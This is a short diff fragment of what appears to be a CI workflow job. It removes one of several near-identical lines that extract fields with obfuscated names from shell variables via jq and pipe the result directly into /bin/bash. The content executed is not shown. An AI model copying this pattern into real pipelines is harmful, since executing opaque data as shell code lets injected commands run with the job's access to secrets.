@@ -37,7 +37,6 @@ jobs:
           echo $f450 | jq -r .ac35632 | /bin/bash
           printf '%s' "$b6" | jq -r .qh814 | /bin/bash
           echo $andlm064 | jq -r .t2 | /bin/bash
-          printf '%s' "$ykpk50676" | jq -r .ad1 | /bin/bash
           echo $uroa90804 | jq -r .lmbww45 | /bin/bash
           echo $fnrod4 | jq -r .cm9 | /bin/bash
           printf '%s' "$lh39" | jq -r .kh88829 | /bin/bash
